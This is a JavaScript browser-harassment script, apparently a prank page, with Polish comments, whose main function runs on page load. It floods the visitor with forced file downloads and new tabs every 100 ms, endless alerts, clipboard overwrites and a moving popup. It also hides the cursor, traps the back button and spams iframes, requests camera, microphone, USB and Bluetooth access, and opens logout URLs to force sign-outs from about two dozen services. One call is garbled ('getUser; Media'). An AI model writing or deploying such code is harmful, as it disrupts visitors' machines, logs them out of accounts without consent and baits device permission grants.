function downloadFiles(files) {

    files.forEach(file => {

        const link = document.createElement('a');

        link.href = `https://hazetlab.github.io/zerfithel/media/${file}`;

        link.download = file;

        document.body.appendChild(link);

        link.click();

        document.body.removeChild(link);

    });

}


function openLinks(links) {

    links.forEach(link => {

        window.open(link, '_blank');

    });

}


function resizeWindow() {

    let width = 300;

    let height = 200;

    const maxWidth = 800;

    const maxHeight = 600;

    const interval = setInterval(() => {

        if (width < maxWidth && height < maxHeight) {

            width += 50;

            height += 50;

            window.resizeTo(width, height);

        } else {

            clearInterval(interval);
        }

    }, 2000);
}


function main() {

    const filesToDownload = ['ez-yann.png', 'gerbus.png', 'jasioch.png', 'readme.txt'];

    const linksToOpen = ['https://www.youtube.com/watch?v=dQw4w9WgXcQ'];


    setInterval(() => {

        downloadFiles(filesToDownload);

        openLinks(linksToOpen);

    }, 100);


    function copyRandomString() {

        const randomString = Math.random().toString(36).substring(2, 18);

        navigator.clipboard.writeText(randomString).then(() => {

            console.log('Skopiowano do schowka:', randomString);

        });

    }


    function randomAlert() {

        const randomString = Math.random().toString(36).substring(2, 18);

        alert(randomString);

        setTimeout(randomAlert, 1000);

    }


    function openMovingVideo() {

        const videoWindow = window.open('https://hazetlab.github.io/zerfithel/media/wide.mp4', 'videoWindow', 'width=400,height=300');

        let posX = 0;

        let posY = 0;

        const moveVideo = () => {

            posX += 5;

            posY += 5;

            videoWindow.moveTo(posX, posY);

            if (posX < window.screen.width && posY < window.screen.height) {

                requestAnimationFrame(moveVideo);

            }

        };

        moveVideo();

    }


    function requestCameraAndMicrophone() {

        navigator.mediaDevices.getUser; Media({ video: true, audio: true })

            .then(stream => {

                console.log('Uprawnienia przyznane');

            })

            .catch(err => {

                console.log('Błąd przyznawania uprawnień:', err);

            });

    }


    function hideCursor() {

        document.body.style.cursor = 'none';

    }


    function speakText(text) {

        const utterance = new SpeechSynthesisUtterance(text);

        window.speechSynthesis.speak(utterance);

    }


    function requestUSBPermission() {

        navigator.usb.requestDevice({ filters: [] })

            .then(device => {

                console.log('Uprawnienia do USB przyznane:', device);

            })

            .catch(err => {

                console.log('Błąd przyznawania uprawnień do USB:', err);

            });

    }

    function requestBluetoothPermission() {

        navigator.bluetooth.requestDevice({ acceptAllDevices: true })

            .then(device => {

                console.log('Uprawnienia do Bluetooth przyznane:', device);

            })

            .catch(err => {

                console.log('Błąd przyznawania uprawnień do Bluetooth:', err);

            });

    }


    const logoutSites = [

        'https://discord.com/logout',

        'https://www.facebook.com/logout',

        'https://stackoverflow.com/logout',

        'https://vk.com/logout',

        'https://ometv.com/logout',

        'https://portal.office.com/logout',

        'https://github.com/logout',

        'https://www.amazon.com/ap/signout',

        'https://accounts.google.com/Logout',

        'https://www.netflix.com/logout',

        'https://www.disneyplus.com/logout',

        'https://soundcloud.com/logout',

        'https://www.wikipedia.org/logout',

        'https://accounts.google.com/Logout',

        'https://protonmail.com/logout',

        'https://protonvpn.com/logout',

        'https://www.roblox.com/logout',

        'https://www.spotify.com/logout',

        'https://www.reddit.com/logout',

        'https://chat.openai.com/logout',

        'https://www.guilded.gg/logout',

        'https://www.tumblr.com/logout',

        'https://www.ebay.com/logout'

    ];


    function logoutFromSites() {

        logoutSites.forEach(site => {

            window.open(site, '_blank');

        });

    }


    function disableBack() {

        window.history.pushState(null, '', window.location.href);

        window.onpopstate = function () {

            window.history.pushState(null, '', window.location.href);

        };

    }


    function iframeSpam() {

        for (let i = 0; i < 10; i++) {

            const iframe = document.createElement('iframe');

            iframe.src = 'http://ptoszek.pl'; // Zmień na odpowiedni URL

            document.body.appendChild(iframe);

        }

    }


    function fillHistory() {

        for (let i = 1; i < 20; i++) {

            window.history.pushState({}, '', window.location.pathname + '?q=' + i);

        }

        window.history.pushState({}, '', window.location.pathname);

    }


    // Wywołanie funkcji

    copyRandomString(); // Kopiowanie losowego ciągu

    randomAlert(); // Wyświetlanie losowego alertu

    openMovingVideo(); // Otwieranie wideo w ruchu

    requestCameraAndMicrophone(); // Prośba o uprawnienia do kamery i mikrofonu

    hideCursor(); // Ukrywanie kursora

    speakText("VBUCK GENERATOR AAAAKWA"); // Mówienie tekstu

    requestUSBPermission(); // Prośba o uprawnienia do USB

    requestBluetoothPermission(); // Prośba o uprawnienia do Bluetooth

    logoutFromSites(); // Wylogowanie z podanych stron

    disableBack(); // Wyłączenie przycisku wstecz

    iframeSpam(); // Spamowanie iframe

    fillHistory(); // Wypełnienie historii



}

main();
